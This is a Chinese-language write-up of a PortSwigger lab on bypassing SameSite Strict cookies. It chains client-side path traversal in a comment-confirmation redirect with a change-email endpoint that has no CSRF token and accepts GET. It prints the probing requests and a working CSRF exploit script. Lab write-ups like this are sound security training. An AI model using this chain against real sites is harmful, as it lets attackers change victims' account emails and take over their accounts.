# 实验：通过客户端重定向绕过 SameSite Strict

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

本实验的修改邮箱功能易受 CSRF 攻击。为了解决本实验，请执行一个 CSRF 攻击以修改受害者的邮箱地址。你应该使用提供的漏洞利用服务器（exploit server）来托管你的攻击代码。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测
- 提交评论后服务器重定向到确认页面
    ```http
    GET /post/comment/confirmation?postId=3 HTTP/2
    ```

    - 服务器响应

        ```html
        <script src='/resources/js/commentConfirmationRedirect.js'>
        </script>
        <script>
        redirectOnConfirmation('/post');
        </script>
        ```

    - `/resources/js/commentConfirmationRedirect.js` 文件内容
        ```js
        redirectOnConfirmation = (blogPath) => {
            setTimeout(() => {
                    const url = new URL(window.location);
                    const postId = url.searchParams.get("postId");
                    window.location = blogPath + '/' + postId;
                },
                3000);
        }
        ```
        - 源：URL
            - 参数：`postId`
        - 汇：`window.location`
            - 上下文：字符串拼接
- 尝试客户端路径遍历
    ```http
    GET /post/comment/confirmation?postId=../../ HTTP/2
    ```
    - 客户端 JS 请求
        ```http
        GET / HTTP/2
        ```
        - 成功进行客户端路径遍历，此时可设置任意客户端重定向路径

探测修改邮箱功能
- 使用修改邮箱功能
    ```http
    POST /my-account/change-email HTTP/2
    Cookie: session=XV9jo3ZS2jr6jw2yPPWgeJ0W3nsJokD3

    email=a%40b&submit=1
    ```
    - 无 csrf 令牌

- 修改请求方法为 GET
    ```http
    GET /my-account/change-email?email=a%40b&submit=1 HTTP/2
    ```

    - 成功

攻击
- 使用评论确认端点的客户端路径遍历+客户端重定向，结合邮件修改请求方法变化
    ```html
    <script>
        window.location = 'https://0a75000a043979a3808b302100b9001e.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=zzz%40b%26submit=1';
    </script>
    ```
    - 注意客户端重定向载荷需 URL 编码
